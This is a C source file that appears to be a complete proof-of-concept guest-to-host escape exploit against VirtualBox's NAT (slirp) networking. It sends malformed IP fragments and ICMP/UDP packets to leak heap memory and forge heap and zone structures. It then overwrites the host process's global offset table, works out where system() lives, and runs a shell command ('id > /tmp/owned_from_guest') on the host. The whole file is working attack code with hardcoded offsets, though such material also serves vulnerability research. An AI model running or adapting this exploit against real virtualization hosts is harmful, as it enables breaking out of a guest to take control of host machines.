#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <net/if.h>
#include <stdio.h>
#include <net/if_arp.h>
#include <netinet/ip_icmp.h>
#include <err.h>
#include <string.h>
#include <stdint.h>
#include <sys/time.h>
#include <poll.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <stddef.h>
#include <assert.h>
#include <stdbool.h>


#define GOT_ADDR 0x608000
#define REMOTE_MEMCPY 0x4010a0
#define STRLEN_OFFSET 0x889b0
#define SYSTEM_OFFSET 0x46590

#define HELPER_PORT 1337

#define ETH_HLEN 14
#define CHUNK_WITH_PADDING_SIZE (40 + 2048 + 4)

struct in_addr src_addr;
struct in_addr dst_addr;
struct in_addr helper_addr;
char *dst_addr_str;
unsigned int ifindex;
char *interface;
unsigned char target_mac[6] = {0, 0, 0, 0, 0, 0};
int packet_socket;

static uint16_t last_ip_id;

uint16_t ip_checksum(char *buf, int len) {
  int count = len;
  uint32_t res = 0;
  while (count > 1) {
    res += *(uint16_t*)buf;
    buf += 2;
    count -= 2;
  }
  if (count > 0) res += *(uint8_t*)buf;
  while (res >> 16) res = (res & 0xffff) + (res >> 16);
  return ~res;
}

uint64_t getmillis(void) {
	struct timeval tv;
	if (gettimeofday(&tv, NULL))
		err(1, "gettimeofday");
	return ((uint64_t)tv.tv_sec) * 1000 + tv.tv_usec / 1000;
}

void parse_mac(unsigned char *bin_mac, const char *buf) {
	if (sscanf(buf, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		bin_mac+0, bin_mac+1, bin_mac+2, bin_mac+3, bin_mac+4, bin_mac+5) != 6)
		errx(1, "unable to parse MAC");
}

void ip_hdr_defaults(struct ip *ip_hdr) {
	ip_hdr->ip_hl = 5;
	ip_hdr->ip_v = 4;
	ip_hdr->ip_tos = 0;
	ip_hdr->ip_id = 0;
	ip_hdr->ip_off = 0;
	ip_hdr->ip_ttl = 100;
	ip_hdr->ip_sum = 0;
	ip_hdr->ip_src = src_addr;
	ip_hdr->ip_dst = dst_addr;
}

char *systemf(const char *command, ...) {
	char *full_command;
	va_list ap;
	va_start(ap, command);
	if (vasprintf(&full_command, command, ap) == -1)
		err(1, "vasprintf");
	va_end(ap);
	printf("systemf: <<<%s>>>\n", full_command);
	FILE *child_stream = popen(full_command, "r");
	char *result = NULL;
	size_t result_size = 0;
	errno = 0;
	int getdelim_res = getdelim(&result, &result_size, '\0', child_stream);
	if (getdelim_res == -1 && errno != 0)
		errx(1, "getdelim reported error");
	if (pclose(child_stream))
		errx(1, "pclose reported error");
	if (getdelim_res != -1) {
		puts(result);
		puts("================================");
	}
	free(full_command);
	return result ? result : strdup("");
}

void hexdump(void *data, size_t len) {
	FILE *stream = popen("hexdump -C", "w");
	if (!stream)
		err(1, "launch hexdump");
	if (fwrite(data, 1, len, stream) != len || fflush(stream))
		errx(1, "hexdump fwrite");
	if (pclose(stream))
		errx(1, "hexdump");
}

#define round_up(n,b) ( ((n)+((b)-1)) / (b) * (b) )

void send_packet(char *packet, size_t len) {
	struct sockaddr_ll dest_addr = {
		.sll_family = AF_PACKET,
		.sll_protocol = htons(ETH_P_IP),
		.sll_ifindex = ifindex,
		.sll_hatype = ARPHRD_ETHER,
		.sll_pkttype = 0, /* only used for receiving */
		.sll_halen = 6
	};
	memcpy(&dest_addr.sll_addr, target_mac, 6);
	if (sendto(packet_socket, packet, len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != len)
		err(1, "unable to send packet");
}
#define SEND_PACKET(packet) send_packet((packet), sizeof(packet))

// send IP packet fragment with given payload; returns IP ID
uint16_t send_fragment_start(char *payload, size_t payload_len) {
	char packet[sizeof(struct ip) + round_up(payload_len,8)];

	struct ip *ip_hdr = (void*)packet;
	ip_hdr_defaults(ip_hdr);
	ip_hdr->ip_len = htons(sizeof(packet));
	ip_hdr->ip_p = IPPROTO_AH; /* something that will be dropped silently */
	ip_hdr->ip_off = htons(IP_MF);
	ip_hdr->ip_id = htons(++last_ip_id);
	ip_hdr->ip_sum = ip_checksum((char*)ip_hdr, sizeof(*ip_hdr));

	memcpy(packet + sizeof(struct ip), payload, payload_len);
	memset(packet + sizeof(struct ip) + payload_len, '\0', round_up(payload_len,8)-payload_len);

	SEND_PACKET(packet);
	return last_ip_id;
}

void send_leak_ping(uint16_t leaksize, uint16_t checksum) {
	char packet[sizeof(struct ip) + sizeof(struct icmp) + 1];

	struct ip *ip_hdr = (void*)packet;
	ip_hdr_defaults(ip_hdr);
	ip_hdr->ip_len = htons(sizeof(packet) + leaksize); /* deliberately incorrect */
	ip_hdr->ip_p = IPPROTO_ICMP;
	ip_hdr->ip_sum = ip_checksum((char*)ip_hdr, sizeof(*ip_hdr));

	struct icmp *icmp_hdr = (void*)(packet + sizeof(struct ip));
	icmp_hdr->icmp_type = ICMP_ECHO;
	icmp_hdr->icmp_code = 0;
	icmp_hdr->icmp_cksum = checksum; /* can be the wrong checksum */
	icmp_hdr->icmp_hun.ih_idseq.icd_id = 0x1337;
	icmp_hdr->icmp_hun.ih_idseq.icd_seq = 0xbeef;

	packet[sizeof(struct ip) + sizeof(struct icmp)] = '#';

	SEND_PACKET(packet);
}

void send_leak_udp(uint16_t leaksize, uint16_t data_offset, uint16_t data_length) {
	char packet[sizeof(struct ip) + sizeof(struct udphdr) + 4];

	struct ip *ip_hdr = (void*)packet;
	ip_hdr_defaults(ip_hdr);
	ip_hdr->ip_dst = helper_addr;
	ip_hdr->ip_len = htons(sizeof(packet) + leaksize); /* deliberately incorrect */
	ip_hdr->ip_p = IPPROTO_UDP;
	ip_hdr->ip_sum = ip_checksum((char*)ip_hdr, sizeof(*ip_hdr));

	struct udphdr *udp_hdr = (void*)(packet + sizeof(struct ip));
	udp_hdr->uh_sport = htons(HELPER_PORT);
	udp_hdr->uh_dport = htons(HELPER_PORT);
	udp_hdr->uh_ulen = htons(ntohs(ip_hdr->ip_len) - sizeof(struct ip));
	udp_hdr->uh_sum = 0; /* with UDP, we're allowed to omit the checksum :) */

	*(uint16_t*)(packet + sizeof(struct ip) + sizeof(struct udphdr)) = data_offset;
	*(uint16_t*)(packet + sizeof(struct ip) + sizeof(struct udphdr) + 2) = data_length;

	SEND_PACKET(packet);
}

void send_udp_datashift(int shift_amount, int data_length) {
	printf("send_udp_datashift(shift_amount=%d, data_length=%d)\n", shift_amount, data_length);
	assert((shift_amount & 3) == 0);
	int ip_header_size = sizeof(struct ip) + shift_amount;
	assert((ip_header_size >> 2) <= 0xf);
	char packet[sizeof(struct ip) + shift_amount + sizeof(struct udphdr) + 1];
	assert(sizeof(packet) + data_length < 0x10000);

	struct ip *ip_hdr = (void*)packet;
	ip_hdr_defaults(ip_hdr);
	ip_hdr->ip_len = htons(sizeof(packet) + data_length); /* deliberately incorrect */
	ip_hdr->ip_p = IPPROTO_UDP;
	ip_hdr->ip_hl = (ip_header_size>>2);
	memset(packet + sizeof(struct ip), '\0', shift_amount);
	ip_hdr->ip_sum = ip_checksum((char*)ip_hdr, sizeof(*ip_hdr) + shift_amount);

	struct udphdr *uh = (void*)(packet + sizeof(struct ip) + shift_amount);
	uh->source = htons(1);
	uh->dest = htons(1);
	uh->len = 50000; /* bogus; will cause packet drop after move */
	uh->check = 0;

	packet[sizeof(struct ip) + shift_amount + sizeof(struct udphdr)] = '#';

	SEND_PACKET(packet);
}

void shift_heap(int shift_amount, int data_length) {
	assert((shift_amount & 3) == 0);
	int max_shift_amount = (0xf<<2) - sizeof(struct ip);
	while (shift_amount > max_shift_amount) {
		send_udp_datashift(max_shift_amount, data_length);
		shift_amount -= max_shift_amount;
		usleep(10000);
	}
	send_udp_datashift(shift_amount, data_length);
}

char *receive_packet(size_t *lenp, uint64_t end_of_wait) {
	struct pollfd pollfd = {
		.fd = packet_socket,
		.events = POLLIN
	};
	int poll_time = end_of_wait - getmillis();
	if (poll_time < 0) poll_time = 0;
	int poll_res = poll(&pollfd, 1, poll_time);
	if (poll_res == -1)
		err(1, "poll");
	if (poll_res == 0)
		return NULL;
	char *packet = malloc(2000);
	if (!packet)
		err(1, "malloc");
	ssize_t res = recv(packet_socket, packet, 2000, MSG_DONTWAIT);
	if (res <= 0)
		err(1, "recv");
	*lenp = res;
	return packet;
}

void *memdup(void *src, size_t len) {
	void *res = malloc(len);
	if (!res && len)
		err(1, "memdup");
	memcpy(res, src, len);
	return res;
}

char *receive_pong(uint64_t end_of_wait, size_t *lenp, int fragment_offset) {
	while (1) {
		size_t len;
		char *packet = receive_packet(&len, end_of_wait);
		if (!packet) return NULL;
		if (len < sizeof(struct ip) + sizeof(struct icmp))
			goto next;
		struct ip *ip_hdr = (void*)packet;
		if (ip_hdr->ip_v != 4) {
			printf("\nwrong v, got %d\n", (int)ip_hdr->ip_v);
			goto next;
		}
		if (ip_hdr->ip_p != IPPROTO_ICMP) {
			printf("\nwrong protocol (got %d)\n", (int)ip_hdr->ip_p);
			goto next;
		}
		printf("\ngot ICMP, len=%d\n", (int)len);
		int off = (ntohs(ip_hdr->ip_off) & 0x1fff) << 3;
		if (off != fragment_offset) {
			printf("\nwrong offset (got %d)\n", off);
			goto next;
		}
		struct icmp *icmp_hdr = (void*)(packet + sizeof(struct ip));
		if (icmp_hdr->icmp_type != ICMP_ECHOREPLY/* || icmp_hdr->icmp_hun.ih_idseq.icd_id != 0x1337 || icmp_hdr->icmp_hun.ih_idseq.icd_seq != 0xbeef*/) {
			printf("\nwrong type/magic: type=%d, id=%d, seq=%d\n",
				(int)icmp_hdr->icmp_type,
				(int)icmp_hdr->icmp_hun.ih_idseq.icd_id,
				(int)icmp_hdr->icmp_hun.ih_idseq.icd_seq);
			goto next;
		}
		*lenp = len - sizeof(struct ip) - sizeof(struct icmp);
		char *res = memdup(packet + sizeof(struct ip) + sizeof(struct icmp), *lenp);
		free(packet);
		return res;
next:
		free(packet);
	}
}

void discard_packets(uint64_t duration) {
	uint64_t end = getmillis() + duration;
	while (getmillis() < end) {
		size_t len;
		free(receive_packet(&len, end));
	}
}

char *ping_leak_brute(size_t *lenp, uint16_t leaksize, int fragment_offset) {
start:;
	char *res;
	for (int checksum = 0; checksum < 0x10000; checksum++) {
		if ((checksum & 0xf) == 0) printf("\rbruting checksum %d/%d...", checksum, 0x10000);
		send_leak_ping(leaksize, checksum);
		res = receive_pong(getmillis()+5, lenp, fragment_offset);
		if (res)
			goto got_reply;
	}
	res = receive_pong(getmillis()+500, lenp, fragment_offset);
	puts("");
	if (!res) {
		puts("!!! expected pong, didn't get any. retrying...");
		goto start;
	}
got_reply:
	discard_packets(500); /* don't let the next receive_pong() read our pending pong packets */
	return res;
}

char *leak_udp(uint16_t leaksize, uint16_t data_offset, uint16_t data_length) {
	while (1) {
		send_leak_udp(leaksize, data_offset, data_length);
		size_t len;
		char *packet = receive_packet(&len, getmillis()+5000);
		if (!packet) goto next;
		if (len < sizeof(struct ip) + sizeof(struct udphdr) + 4)
			goto next;
		struct ip *ip_hdr = (void*)packet;
		if (ip_hdr->ip_v != 4) {
			printf("\nwrong v, got %d\n", (int)ip_hdr->ip_v);
			goto next;
		}
		if (ip_hdr->ip_p != IPPROTO_UDP) {
			printf("\nwrong protocol (got %d)\n", (int)ip_hdr->ip_p);
			goto next;
		}
		printf("\ngot UDP, len=%d\n", (int)len);
		if (ntohs(ip_hdr->ip_off) != 0) {
			printf("\nunexpected fragmentation\n");
			goto next;
		}
		size_t payload_len = len - sizeof(struct ip) - sizeof(struct udphdr);
		if (payload_len != data_length) {
			printf("\nunexpected length (%d != %d)\n", (int)payload_len, (int)data_length);
			goto next;
		}
		char *res = memdup(packet + sizeof(struct ip) + sizeof(struct udphdr), payload_len);
		free(packet);
		puts("leak_udp successful");
		discard_packets(500);
		return res;
next:
		free(packet);
		puts("didn't get UDP reply, retrying...");
	}
}

void restore_iptables(void) {
	systemf("iptables -D OUTPUT -o %s -j DROP", interface);
}

struct vbox_heap_item {
	uint32_t magic /*= 0xdead0001*/;
	uint32_t pad1;
	uint64_t zone_ptr;
	uint32_t ref_count;
	uint32_t pad2;
	uint64_t next_item_ptr;
	uint64_t previous_next_ptr;
};

#define RTCRITSECT_FLAGS_NOP 0x8
struct vbox_critsect {
	uint32_t u32Magic;
	int32_t cLockers;
	uint64_t NativeThreadOwner;
	int32_t cNestings;
	uint32_t fFlags;
	uint64_t EventSem;
	uint64_t pValidatorRec;
	uint64_t Alignment;
} RTCRITSECT;

struct vbox_zone {
	uint32_t magic;
	uint32_t pad1;
	uint64_t pData;
	struct vbox_critsect csZone;
	uint64_t name;
	uint64_t size; /* item size */
	uint64_t pfCtor;
	uint64_t pfDtor;
	uint64_t pfInit;
	uint64_t pfFini;
	uint64_t pfAlloc;
	uint64_t pfFree;
	int max_items;
	int cur_items;
	uint64_t used_items_head;
	uint64_t free_items_head;
	uint64_t master_zone;
	uint64_t area;
	bool fDoXmitPending;
};

uint64_t real_zone;
struct vbox_heap_item *leak_item(void) {
	puts("trying to leak...");
	int item_offset = 2048 - 14/*ethernet header*/ - sizeof(struct ip) - sizeof(struct udphdr) + 4/*end-of-item magic*/;
	char *ping_leak_data = leak_udp(2500, item_offset, sizeof(struct vbox_heap_item));
	puts("got data");
	hexdump(ping_leak_data, sizeof(struct vbox_heap_item));
	struct vbox_heap_item *item = (void*)ping_leak_data;
	if (real_zone == 0)
		real_zone = item->zone_ptr;
	assert(item->magic == 0xdead0001);
	printf("magic: 0x%x\n", item->magic);
	printf("zone: 0x%llx\n", (unsigned long long)item->zone_ptr);
	printf("refcount: 0x%x\n", item->ref_count);
	printf("next: 0x%llx\n", (unsigned long long)item->next_item_ptr);
	printf("prev: 0x%llx\n", (unsigned long long)item->previous_next_ptr - offsetof(struct vbox_heap_item, next_item_ptr));
	return item;
}

void defrag(int count) {
	puts("defragging...");
	for (int i=0; i<count; i++) {
		if (i != 0) usleep(200000);
		char payload[100];
		sprintf(payload, "DEFRAGGING %d", i);
		send_fragment_start(payload, strlen(payload));
	}
	puts("defragged");
}

struct write_info {
	uint64_t dst;
	char *data;
	size_t data_len;
};

// assumes defragged heap
void write_memory(struct write_info *writes, int nwrites) {
	for (int i=0; i<nwrites; i++)
		assert(writes[i].data_len <= ETH_HLEN);

	// STEP 1: send packet with prev-target and fake uma_zone
	for (int i=0; i<nwrites; i++) {
		char packet[sizeof(struct ip) + round_up(sizeof(uint64_t) + sizeof(struct vbox_zone), 8)];
		memset(packet, '\0', sizeof(packet));

		struct ip *ip_hdr = (void*)packet;
		ip_hdr_defaults(ip_hdr);
		ip_hdr->ip_len = htons(sizeof(packet));
		ip_hdr->ip_p = IPPROTO_AH; /* something that will be dropped silently */
		ip_hdr->ip_off = htons(IP_MF);
		ip_hdr->ip_id = htons(++last_ip_id);
		ip_hdr->ip_sum = ip_checksum((char*)ip_hdr, sizeof(*ip_hdr));

		struct vbox_zone *zone = (void*)(packet + sizeof(struct ip) + sizeof(uint64_t));
		zone->magic = 0x89abcdef; /* not the right magic, just something we can recognize */
		zone->pad1 = 0x01234567;
		zone->csZone.fFlags = RTCRITSECT_FLAGS_NOP;
		zone->pfFini = REMOTE_MEMCPY;
		zone->pfDtor = 0;
		zone->free_items_head = 0;
		zone->fDoXmitPending = false;
		zone->size = writes[i].data_len;
		zone->pData = writes[i].dst;

		SEND_PACKET(packet);
		usleep(10000);
	}

	// STEP 2: leak header of last packet from step 1 to determine where it is
	struct vbox_heap_item *leaked_item = leak_item();

	// STEP 3: defrag (to mitigate the mess a UDP reply creates on the heap)
	defrag(5);

	// heap (at observed time) should contain consecutive allocations for leaking UDP packet, fake zone packet and defrag packet or another
	// fake zone packet, all consecutively on the allocated list
	uint64_t fake_zone_packet_item = leaked_item->next_item_ptr - CHUNK_WITH_PADDING_SIZE;
	assert(fake_zone_packet_item == leaked_item->previous_next_ptr - offsetof(struct vbox_heap_item, next_item_ptr) + CHUNK_WITH_PADDING_SIZE);
	uint64_t dummy_next_ptr = fake_zone_packet_item + sizeof(struct vbox_heap_item) + ETH_HLEN + sizeof(struct ip) + nwrites * CHUNK_WITH_PADDING_SIZE;

	uint16_t clobbered_frags_ip_id = ++last_ip_id;
	const size_t fragment_length = round_up(2 + sizeof(struct vbox_heap_item) + ETH_HLEN + sizeof(struct ip), 8);
	assert(nwrites * fragment_length < 0x2000);
	for (int i=0; i<nwrites; i++) {
		// STEP 4: send fragments with fake `struct vbox_heap_item`
		dummy_next_ptr -= CHUNK_WITH_PADDING_SIZE;
		uint64_t fake_zone_ptr = dummy_next_ptr + sizeof(uint64_t);
		printf("fake zone packet item at 0x%llx, dummy_next at 0x%llx, fake_zone at 0x%llx\n", fake_zone_packet_item, dummy_next_ptr, fake_zone_ptr);

		char packet[sizeof(struct ip) + fragment_length];
		memset(packet, '\0', sizeof(packet));

		struct ip *ip_hdr = (void*)packet;
		ip_hdr_defaults(ip_hdr);
		ip_hdr->ip_len = htons(sizeof(packet));
		ip_hdr->ip_p = IPPROTO_AH; /* something that will be dropped silently */
		ip_hdr->ip_off = htons(IP_MF + i * (fragment_length>>3));
		ip_hdr->ip_id = htons(clobbered_frags_ip_id);
		ip_hdr->ip_sum = ip_checksum((char*)ip_hdr, sizeof(*ip_hdr));

		struct vbox_heap_item *item = (void*)(packet + sizeof(struct ip) + 2);
		item->zone_ptr = fake_zone_ptr;
		item->ref_count = 1;
		item->next_item_ptr = 0;
		item->previous_next_ptr = dummy_next_ptr;

		memcpy(packet + sizeof(struct ip) + 2 + sizeof(struct vbox_heap_item), writes[i].data, writes[i].data_len);
		memset(packet + sizeof(struct ip) + 2 + sizeof(struct vbox_heap_item) + writes[i].data_len, '=', ETH_HLEN - writes[i].data_len);

		struct ip *ip_hdr_copy = (void*)(packet + sizeof(struct ip) + 2 + sizeof(struct vbox_heap_item) + ETH_HLEN);
		*ip_hdr_copy = *ip_hdr;
		ip_hdr_copy->ip_len = ntohs(ip_hdr_copy->ip_len) - sizeof(struct ip);
		ip_hdr_copy->ip_off = ntohs(ip_hdr->ip_off) << 3; /* iow, this is the original, unshifted fragment length */
		ip_hdr_copy->ip_id = ntohs(ip_hdr_copy->ip_id);


		SEND_PACKET(packet);
		usleep(10000);
	}

	// STEP 5: move item contents to the left
	shift_heap(sizeof(struct vbox_heap_item) + ETH_HLEN + sizeof(struct ip) + 2, 1000 + nwrites * CHUNK_WITH_PADDING_SIZE);
	usleep(200000);

	// STEP 6: free fragments, trigger bug multiple times
	char packet2[sizeof(struct ip) + 1];
	struct ip *ip_hdr2 = (void*)packet2;
	ip_hdr_defaults(ip_hdr2);
	ip_hdr2->ip_len = htons(sizeof(packet2));
	ip_hdr2->ip_p = IPPROTO_AH;
	ip_hdr2->ip_off = htons((nwrites * fragment_length) >> 3);
	ip_hdr2->ip_id = htons(clobbered_frags_ip_id);
	ip_hdr2->ip_sum = ip_checksum((char*)ip_hdr2, sizeof(*ip_hdr2));
	printf("sending packet2, ip_off=0x%hx, ip_id=0x%hx\n", ntohs(ip_hdr2->ip_off), ntohs(ip_hdr2->ip_id));
	packet2[sizeof(struct ip)] = '#';
	SEND_PACKET(packet2);
}

void call_system(uint64_t system_addr, uint64_t cmd_addr) {
	// STEP 1: send packet with prev-target and fake uma_zone
	{
		char packet[sizeof(struct ip) + round_up(sizeof(uint64_t) + sizeof(struct vbox_zone), 8)];
		memset(packet, '\0', sizeof(packet));

		struct ip *ip_hdr = (void*)packet;
		ip_hdr_defaults(ip_hdr);
		ip_hdr->ip_len = htons(sizeof(packet));
		ip_hdr->ip_p = IPPROTO_AH; /* something that will be dropped silently */
		ip_hdr->ip_off = htons(IP_MF);
		ip_hdr->ip_id = htons(++last_ip_id);
		ip_hdr->ip_sum = ip_checksum((char*)ip_hdr, sizeof(*ip_hdr));

		struct vbox_zone *zone = (void*)(packet + sizeof(struct ip) + sizeof(uint64_t));
		zone->magic = 0x89abcdef; /* not the right magic, just something we can recognize */
		zone->pad1 = 0x01234567;
		zone->csZone.fFlags = RTCRITSECT_FLAGS_NOP;
		zone->pfFini = system_addr;
		zone->pfDtor = 0;
		zone->free_items_head = 0;
		zone->fDoXmitPending = false;
		zone->size = 0 /*arg3*/;
		zone->pData = cmd_addr /*arg1*/;

		SEND_PACKET(packet);
		usleep(10000);
	}

	// STEP 2: leak header of last packet from step 1 to determine where it is
	struct vbox_heap_item *leaked_item = leak_item();

	// STEP 3: defrag (to mitigate the mess a UDP reply creates on the heap)
	defrag(5);

	// heap (at observed time) should contain consecutive allocations for leaking UDP packet, fake zone packet and defrag packet or another
	// fake zone packet, all consecutively on the allocated list
	uint64_t fake_zone_packet_item = leaked_item->next_item_ptr - CHUNK_WITH_PADDING_SIZE;
	assert(fake_zone_packet_item == leaked_item->previous_next_ptr - offsetof(struct vbox_heap_item, next_item_ptr) + CHUNK_WITH_PADDING_SIZE);
	uint64_t dummy_next_ptr = fake_zone_packet_item + sizeof(struct vbox_heap_item) + ETH_HLEN + sizeof(struct ip);

	uint16_t clobbered_frag_ip_id = ++last_ip_id;
	const size_t fragment_length = round_up(2 + sizeof(struct vbox_heap_item) + ETH_HLEN + sizeof(struct ip), 8);
	{
		// STEP 4: send fragment with fake `struct vbox_heap_item`
		uint64_t fake_zone_ptr = dummy_next_ptr + sizeof(uint64_t);
		printf("fake zone packet item at 0x%llx, dummy_next at 0x%llx, fake_zone at 0x%llx\n", fake_zone_packet_item, dummy_next_ptr, fake_zone_ptr);

		char packet[sizeof(struct ip) + fragment_length];
		memset(packet, '\0', sizeof(packet));

		struct ip *ip_hdr = (void*)packet;
		ip_hdr_defaults(ip_hdr);
		ip_hdr->ip_len = htons(sizeof(packet));
		ip_hdr->ip_p = IPPROTO_AH; /* something that will be dropped silently */
		ip_hdr->ip_off = htons(IP_MF);
		ip_hdr->ip_id = htons(clobbered_frag_ip_id);
		ip_hdr->ip_sum = ip_checksum((char*)ip_hdr, sizeof(*ip_hdr));

		struct vbox_heap_item *item = (void*)(packet + sizeof(struct ip) + 2);
		item->zone_ptr = fake_zone_ptr;
		item->ref_count = 1;
		item->next_item_ptr = 0;
		item->previous_next_ptr = dummy_next_ptr;

		struct ip *ip_hdr_copy = (void*)(packet + sizeof(struct ip) + 2 + sizeof(struct vbox_heap_item) + ETH_HLEN);
		*ip_hdr_copy = *ip_hdr;
		ip_hdr_copy->ip_len = ntohs(ip_hdr_copy->ip_len) - sizeof(struct ip);
		ip_hdr_copy->ip_off = ntohs(ip_hdr->ip_off) << 3; /* iow, this is the original, unshifted fragment length */
		ip_hdr_copy->ip_id = ntohs(ip_hdr_copy->ip_id);


		SEND_PACKET(packet);
		usleep(10000);
	}

	// STEP 5: move item contents to the left
	shift_heap(sizeof(struct vbox_heap_item) + ETH_HLEN + sizeof(struct ip) + 2, 1000 + CHUNK_WITH_PADDING_SIZE);
	usleep(200000);

	// STEP 6: free fragment, trigger bug
	char packet2[sizeof(struct ip) + 1];
	struct ip *ip_hdr2 = (void*)packet2;
	ip_hdr_defaults(ip_hdr2);
	ip_hdr2->ip_len = htons(sizeof(packet2));
	ip_hdr2->ip_p = IPPROTO_AH;
	ip_hdr2->ip_off = htons(fragment_length >> 3);
	ip_hdr2->ip_id = htons(clobbered_frag_ip_id);
	ip_hdr2->ip_sum = ip_checksum((char*)ip_hdr2, sizeof(*ip_hdr2));
	printf("sending packet2, ip_off=0x%hx, ip_id=0x%hx\n", ntohs(ip_hdr2->ip_off), ntohs(ip_hdr2->ip_id));
	packet2[sizeof(struct ip)] = '#';
	SEND_PACKET(packet2);
}

int main(int argc, char **argv) {
	if (argc != 2)
		errx(1, "bad invocation, want ./bcs <helper_ip>");
	if (inet_pton(AF_INET, argv[1], &helper_addr) != 1)
		err(1, "unable to parse helper IP address");

	setbuf(stdout, NULL);

	// figure out interface, IPs, MAC address
	interface = systemf("ip route get 8.8.8.8 | grep ' dev ' | sed 's|.* dev \\([^ ]*\\) .*|\\1|' | tr -d '\\n'");
	if (inet_pton(AF_INET, systemf("ip route get 8.8.8.8 | grep ' dev ' | sed 's|.* src \\([^ ]*\\) .*|\\1|' | tr -d '\\n'"), &src_addr) != 1)
		err(1, "unable to convert source IP");
	dst_addr_str = systemf("ip route get 8.8.8.8 | grep ' dev ' | sed 's|.* via \\([^ ]*\\) .*|\\1|' | tr -d '\\n'");
	if (inet_pton(AF_INET, dst_addr_str, &dst_addr) != 1)
		err(1, "unable to convert dest IP");
	systemf("ping -c3 -w4 %s", dst_addr_str);
	//parse_mac(target_mac, systemf("ip link show %s | grep link/ether | sed 's|.*link/ether \\([^ ]*\\) .*|\\1|' | tr -d '\n'", interface));
	ifindex = if_nametoindex(interface);
	if (ifindex == 0)
		errx(1, "unable to resolve interface name");

	// Ensure that we won't be sending ARP traffic that interferes with the attack.
	// Note that slirp doesn't really care what MAC address we use to talk to it.
	systemf("arp -s %s 01:23:45:67:89:ab", dst_addr_str);

	// if other stuff sends packets while we're doing the attack, that might break stuff
	systemf("iptables -I OUTPUT -o %s -j DROP", interface);
	atexit(restore_iptables);
	usleep(100000);

	packet_socket = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
	if (packet_socket == -1)
		err(1, "socket");

	struct sockaddr_ll bind_addr = {
		.sll_family = AF_PACKET,
		.sll_protocol = htons(ETH_P_IP),
		.sll_ifindex = ifindex
	};
	if (bind(packet_socket, (struct sockaddr *)&bind_addr, sizeof(bind_addr)))
		err(1, "binding packet_socket");

	defrag(10);

	{
		char shell_command[] = "id > /tmp/owned_from_guest";
		char packet[sizeof(struct ip) + round_up(sizeof(shell_command), 8)];
		memset(packet, '\0', sizeof(packet));

		struct ip *ip_hdr = (void*)packet;
		ip_hdr_defaults(ip_hdr);
		ip_hdr->ip_len = htons(sizeof(packet));
		ip_hdr->ip_p = IPPROTO_AH; /* something that will be dropped silently */
		ip_hdr->ip_off = htons(IP_MF);
		ip_hdr->ip_id = htons(++last_ip_id);
		ip_hdr->ip_sum = ip_checksum((char*)ip_hdr, sizeof(*ip_hdr));

		strcpy(packet + sizeof(struct ip), shell_command);

		SEND_PACKET(packet);
		usleep(10000);
	}

	struct vbox_heap_item *high_heap_item = leak_item();
	assert(high_heap_item->next_item_ptr - CHUNK_WITH_PADDING_SIZE == high_heap_item->previous_next_ptr - offsetof(struct vbox_heap_item, next_item_ptr) + CHUNK_WITH_PADDING_SIZE);
	defrag(5);
	uint64_t shell_command_address = high_heap_item->next_item_ptr - CHUNK_WITH_PADDING_SIZE + sizeof(struct vbox_heap_item) + ETH_HLEN + sizeof(struct ip);
	printf("placed shell command at 0x%llx\n", shell_command_address);

	struct vbox_heap_item got_heap_item = {
		.magic = 0x45454545,
		.pad1 = 0x46464646,
		.zone_ptr = high_heap_item->zone_ptr,
		.ref_count = 0,
		.pad2 = 0x47474747,
		.next_item_ptr = high_heap_item->next_item_ptr - 700 * CHUNK_WITH_PADDING_SIZE,
		.previous_next_ptr = high_heap_item->zone_ptr + offsetof(struct vbox_zone, free_items_head)
	};
	const uint64_t got_addr = GOT_ADDR;
	struct write_info writes[] = {
		/* use got_heap_item as freelist head */
		{.dst = high_heap_item->zone_ptr + offsetof(struct vbox_zone, free_items_head), .data = (char*)&got_addr, .data_len = 8},
		/* overwrite GOT start with got_heap_item */
		{.dst = GOT_ADDR + 0*ETH_HLEN, .data = 0*ETH_HLEN + (char*)&got_heap_item, .data_len = ETH_HLEN},
		{.dst = GOT_ADDR + 1*ETH_HLEN, .data = 1*ETH_HLEN + (char*)&got_heap_item, .data_len = ETH_HLEN},
		{.dst = GOT_ADDR + 2*ETH_HLEN, .data = 2*ETH_HLEN + (char*)&got_heap_item, .data_len = sizeof(got_heap_item)-2*ETH_HLEN},
	};
	printf("freelist head at 0x%llx\n", high_heap_item->zone_ptr + offsetof(struct vbox_zone, free_items_head));
	write_memory(writes, 4);
	sleep(1);

	puts("trying to leak GOT from fake chunk...");
	hexdump(leak_udp(512+6, 6, 512), 512);
	defrag(1);
try_got_leak_again:;
	uint64_t *leaked_got = (void*)leak_udp(512+6, 6, 512);
	hexdump(leaked_got, 512);
	if (leaked_got[2] == 0) {
		sleep(1);
		defrag(1);
		goto try_got_leak_again;
	}
	printf("strlen at 0x%llx\n", leaked_got[2]);

	assert((leaked_got[2]&0xfff) == (STRLEN_OFFSET&0xfff));
	uint64_t system_addr = leaked_got[2] - STRLEN_OFFSET + SYSTEM_OFFSET;
	printf("system() at 0x%llx\n", system_addr);

	puts("calling system()...");
	defrag(5);

	call_system(system_addr, shell_command_address);

	puts("did that work?");

	return 0;
}

